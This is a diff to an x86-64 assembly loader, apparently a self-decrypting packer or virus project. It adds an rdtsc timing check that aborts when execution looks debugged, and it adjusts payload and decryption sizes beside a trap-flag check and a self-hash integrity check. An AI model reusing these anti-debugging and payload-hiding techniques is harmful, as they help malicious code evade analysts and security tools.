@@ -3,6 +3,13 @@ global ft_end
 global syscalls
 
 syscalls:
+	rdtsc
+	mov r12, rax
+	rdtsc
+	sub rax, r12
+	cmp rax, 0xff
+	jg end_ft_end
+
 	mov rdi, 0 ; syscalls
 	mov rsi, 0 ; syscalls
 	mov rdx, 1 ; syscalls
@@ -14,16 +21,16 @@ hash:
 ;    mov edi, 5381 ;hash
 	mov edi, r13d ; r13 got result of hash loader
 ;    mov r13d, edi ;hash bis
-    mov rdx, 0x1FCE ;size payload + bis_size a modifier
+    mov rdx, 0x1F4F ;size payload + bis_size a modifier
     pushfq ; verif step by step
     mov rsi, 0 ;inc
 	lea rcx, [syscalls] ;adresse syscalls
 	pop r12
 
 hash_loop1:
-	cmp rsi, 0x75
+	cmp rsi, 0x91
 	jl after_cmp
-    cmp rsi, 0x79
+    cmp rsi, 0x95
     jle hash_loop2
 after_cmp:
     shl edi, 5
@@ -98,7 +105,7 @@ ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x1e3d;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x1dc8;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 ;
 	jmp after_exit_3
